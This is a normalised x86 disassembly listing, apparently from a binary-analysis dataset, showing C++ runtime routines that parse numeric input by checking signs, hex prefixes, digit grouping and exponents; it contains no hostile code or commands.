and [ ebp - 0x70 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x124 ]
call sub_10001500
mov ecx [ ebp - 0x6c ]
call sub_10007c7b
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov edi [ ebp - 0x7c ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
test si si
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x98 ]
call sub_10005239
mov ecx [ ebp - 0x6c ]
call sub_10007d14
lea eax [ ebp - 0x140 ]
push eax
mov ecx ebx
call sub_10040480
or [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10007d14
lea eax [ ebp - 0x15c ]
push eax
mov ecx ebx
call sub_100403e9
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001450
push esi
lea ecx [ ebp - 0x15c ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10007c7b
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_1000517a
mov ecx [ ebp - 0x6c ]
call sub_10007d14
mov esi [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] esi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10007c7b
cmp ax si
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100079fe
push [ ebp - 0x74 ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0xc
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_10040480
or [ ebp - 0x70 ] 0x10
push esi
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_10005326
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10007c7b
cmp [ esi ] ax
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10001500
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002020
jmp r-xdata
sub esi [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x10
mov esi [ ebp - 0x60 ]
jae r-xdata
mov ecx esi
call sub_10007c7b
cmp [ ebp - 0x80 ] ax
ja r-xdata
test [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x108 ]
call sub_10001500
mov bl 0x1
jmp r-xdata
push [ ebp - 0x80 ]
mov ecx edi
push 0x1
call sub_1000517a
dec esi
jne r-xdata
jmp r-xdata
mov ecx edi
call sub_10007d14
push [ ebp - 0x74 ]
push edi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x60 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10007c7b
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x70 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_10001500
test [ ebp - 0x70 ] 0x10
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax [ ebp - 0x9c ]
jge r-xdata
mov eax [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
test edi edi
jbe r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_10007c7b
cmp ax [ ebp - 0xb8 ]
jne r-xdata
mov ecx esi
call sub_10007c7b
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_1000517a
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10007d14
mov ecx [ ebp - 0xa0 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_10040480
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10001450
push 0x0
push 0x1
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001500
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10007c7b
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov [ ebp - 0x65 ] 0x1
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10002020
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
inc edi
mov ecx esi
call sub_10007d14
push [ ebp - 0x74 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
mov ecx edi
call sub_10007c7b
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
mov ecx edi
call sub_10007c7b
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_1000517a
inc [ ebp - 0x84 ]
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_100430fd
push 0x11c
mov eax sub_1004c1c5
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x74 ] ecx
xor edi edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10041e22
pop ecx
lea ecx [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10041ebf
pop ecx
lea ecx [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x6c ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10003c49
add esi 0x8
push esi
push edi
push 0x30
call sub_100087f2
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
mov [ ebp - 0x78 ] esi
call sub_10040467
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax edi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x6c ]
sub ecx eax
push esi
inc ecx
push ecx
push edi
lea ecx [ ebp + 0x24 ]
call sub_10040596
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_10003efc
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_100403e9
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_10040480
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
xor esi esi
mov [ ebp - 0x65 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_100403d0
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10001450
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001500
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x48 ]
call sub_10001450
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_10001500
lea ecx [ ebp - 0x64 ]
call sub_10003efc
mov eax [ ebp - 0x74 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
movzx eax ax
mov [ ebp - 0x70 ] eax
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x6c ]
jmp r-xdata
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x65 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + 0x18 ]
cmp eax edi
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
xor esi esi
cmp eax esi
jbe r-xdata
mov edx [ ebp - 0x6c ]
cmp [ ebp + 0x38 ] edx
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x7c ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
mov eax edx
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10040596
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0x94 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f903
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f903
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ecx + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edi edi
cmp edi edx
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
mov edi eax
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7c ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f903
add esp 0x14
xor esi esi
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10008a30
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x7c ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f8c7
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x74 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x84 ]
call sub_1003f903
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_10001500
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10001500
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_10001500
mov eax [ ebp - 0x84 ]
call sub_100282ef
retn 0x38
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008a30
mov ecx eax
call sub_10017b71
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f8c7
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008a30
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf0 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008a30
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd0 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008a30
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x6c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x118 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f8c7
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10007c55
push [ ebp - 0x6c ]
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008a50
mov ecx eax
call sub_1003cff6
push [ ebp - 0x6c ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe0 ]
jmp r-xdata
push [ ebp - 0x78 ]
lea ecx [ ebp + 0xc ]
call sub_10007c55
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10007c55
mov eax [ ebp - 0x6c ]
sub eax [ ebp + 0x38 ]
push eax
push [ ebp - 0x78 ]
lea eax [ ebp - 0xd8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003f903
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008a30
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf8 ]
jmp r-xdata
sub_1004364b
push 0x10
mov eax sub_1004c1ed
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003779
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100426b8
push edi
push ebx
push eax
call sub_100085d5
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_100426f7
push edi
push ebx
push eax
call sub_100085d5
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1004b19c
mov [ esi + 0x10 ] eax
call sub_100282db
retn 0x4
sub_100436ce
push 0x64
mov eax sub_1004c218
call sub_1002826c
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10042133
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10040467
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x34 ] eax
je r-xdata
lea ebx [ esi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] ebx
call sub_1003e793
mov esi [ ebp - 0x6c ]
add esp 0xc
push [ ebp - 0x5c ]
movzx eax ax
mov ecx edi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] esi
call sub_1003fe92
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
push ebx
push 0x0
push 0x2b
call sub_1003e793
add esp 0xc
mov ecx edi
mov bx ax
call sub_10040010
cmp ax bx
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x2d
call sub_1003e793
add esp 0xc
mov ecx edi
mov bx ax
call sub_10040010
cmp ax bx
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
mov [ esi ] 0x2d
lea eax [ esi + 0x1 ]
mov ecx edi
mov [ ebp - 0x54 ] eax
call sub_1003fdb2
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_10040010
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_1003fdb2
push [ ebp - 0x5c ]
push edi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
push [ ebp - 0x60 ]
mov ecx edi
call sub_10040010
movzx eax ax
push eax
call sub_1003f09c
mov esi [ ebp - 0x54 ]
push [ ebp - 0x64 ]
mov [ esi ] al
movsx eax al
push eax
push r--data
call sub_10024c40
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x78
call sub_1003e793
add esp 0xc
mov ecx edi
mov bx ax
call sub_10040010
cmp ax bx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_100079fe
push [ ebp - 0x5c ]
add esi 0x1f
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
mov [ ebp - 0x70 ] esi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x58
call sub_1003e793
add esp 0xc
mov ecx edi
mov bx ax
call sub_10040010
cmp ax bx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x54 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp esi [ ebp - 0x70 ]
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_1003fdb2
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_10040010
cmp ax [ ebp - 0x68 ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
inc esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10002020
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax [ ebp - 0x50 ]
call sub_100282ef
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
inc ebx
mov ecx edi
call sub_1003fdb2
push [ ebp - 0x5c ]
push edi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_10043a1e
push 0x60
mov eax sub_1004c24d
call sub_1002826c
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_10042133
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x6c ] ecx
call sub_10040467
and [ ebp - 0x4 ] 0x0
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x64 ] edi
call sub_1003e793
add esp 0xc
push [ ebp - 0x58 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4a ] 0x0
call sub_1003fe92
test al al
jne r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
push edi
push 0x0
push 0x2b
call sub_1003e793
add esp 0xc
mov ecx esi
mov di ax
call sub_10040010
cmp ax di
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_1003e793
add esp 0xc
mov ecx esi
mov di ax
call sub_10040010
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ebx [ ebp - 0x68 ]
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_1003fdb2
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10040010
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
movzx edi ax
call sub_10040010
cmp ax di
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10040010
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
movzx edi ax
call sub_100079fe
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
jmp r-xdata
call sub_10024c18
mov eax [ eax ]
mov al [ eax ]
mov [ ebx ] al
mov ecx esi
inc ebx
call sub_1003fdb2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_10040010
cmp [ ebp - 0x54 ] ax
ja r-xdata
mov ecx esi
call sub_10040010
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x30
inc ebx
mov ecx esi
call sub_10040010
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10040010
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10040010
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10040010
cmp ax [ ebp - 0x54 ]
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov ecx esi
call sub_10040010
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003fdb2
push [ ebp - 0x58 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10002020
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
test di di
je r-xdata
cmp [ ebp - 0x50 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x50 ] 0x24
jge r-xdata
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x65
call sub_1003e793
add esp 0xc
mov ecx esi
mov di ax
call sub_10040010
cmp ax di
je r-xdata
dec [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003fdb2
mov [ ebx ] 0x30
inc ebx
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ edi ] 0x7f
je r-xdata
push [ ebp - 0x5c ]
